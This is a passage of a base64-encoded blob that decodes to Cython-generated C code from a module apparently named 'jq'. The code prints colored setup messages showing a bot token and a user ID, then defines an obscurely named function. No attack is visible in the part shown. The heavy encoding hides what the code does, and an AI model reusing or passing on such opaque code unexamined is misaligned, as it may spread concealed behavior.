E2WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjQ7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTYsIDMsIDEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzkpICsgNjAsIDY1NTM1IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOSkpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzJ9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTAzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF8yID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQk9MRCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dSRUVOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdF8xMlswXSA9IF9fcHl4X3RfOTtcbiAgX19weXhfdF8xMlsxXSA9IF9fcHl4X3RfMTE7XG4gIF9fcHl4X3RfMTJbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NldHVwX0NvbXBsZXRlO1xuICBfX3B5eF90XzEyWzNdID0gX19weXhfdF81O1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzEyLCA0LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzkpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xMSkgKyAxNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSksIDY1NTM1IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSk7XG4gIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfdF80fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQk9MRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NZQU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRVNFVCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1Rva2VuKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgX19weXhfdF8xN1swXSA9IF9fcHl4X3RfNTtcbiAgX19weXhfdF8xN1sxXSA9IF9fcHl4X3RfMTE7XG4gIF9fcHl4X3RfMTdbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JvdF9Ub2tlbl8yO1xuICBfX3B5eF90XzE3WzNdID0gX19weXhfdF85O1xuICBfX3B5eF90XzE3WzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjc7XG4gIF9fcHl4X3RfMTdbNV0gPSBfX3B5eF90XzEzO1xuICBfX3B5eF90XzEwID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xNywgNiwgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMTAgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzkpICsgMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzExKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzkpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTMpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8xMH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF8xMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JPTEQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DWUFOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzE3WzBdID0gX19weXhfdF8xMztcbiAgX19weXhfdF8xN1sxXSA9IF9fcHl4X3RfOTtcbiAgX19weXhfdF8xN1syXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVXNlcl9JRF8yO1xuICBfX3B5eF90XzE3WzNdID0gX19weXhfdF8xMTtcbiAgX19weXhfdF8xN1s0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzI3O1xuICBfX3B5eF90XzE3WzVdID0gX19weXhfdF81O1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE3LCA2LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEzKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfOSkgKyA4ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xMSkgKyAxICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTMpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSk7XG4gIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzJ9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF8yID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTUFHRU5UQSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTA4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTA4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEwOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfMTJbMF0gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfMTJbMV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yNDtcbiAgX19weXhfdF8xMlsyXSA9IF9fcHl4X3RfMTE7XG4gIF9fcHl4X3RfMTJbM10gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzEyLCA0LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzUpICsgNjAgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzExKSArIDEsIDY1NTM1IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMDgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfdF80fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTA4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmpxXzFwcHBwLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTExLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5e